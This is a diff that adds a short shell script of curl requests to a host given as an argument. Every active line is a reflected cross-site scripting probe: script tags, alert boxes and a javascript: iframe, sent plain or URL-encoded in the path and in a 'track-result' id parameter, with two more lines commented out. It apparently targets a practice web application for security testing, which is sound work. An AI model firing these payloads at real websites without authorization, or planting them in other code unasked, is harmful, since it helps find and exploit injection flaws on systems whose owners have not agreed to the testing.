@@ -1,0 +1,8 @@
+curl -i "http://$1/<script+src="polyfills.js"+type="module"></script>"
+curl -iX GET "http://$1/<script>ALERT("Show+me+your+SSN")</script>"
+curl -iX GET "http://$1/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60data%20all%20over%20this%20screen%20that%20wasnt%20planned%60)%22%3E"
+curl -iX GET "http://$1/track-result?id=%3Cscript%3Ealert(%22Show%20Me%20Your%20SSN%22)%3C%2Fscript%3E"
+
+
+#curl -iX GET "http://$1/#/track-result?id=%3Cscript%3Ealert(%22Show%20Me%20Your%20SSN%22)%3C%2Fscript%3E"
+#curl -iX GET "http://$1/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60data%20all%20over%20this%20screen%20that%20wasnt%20planned%60)%22%3E"
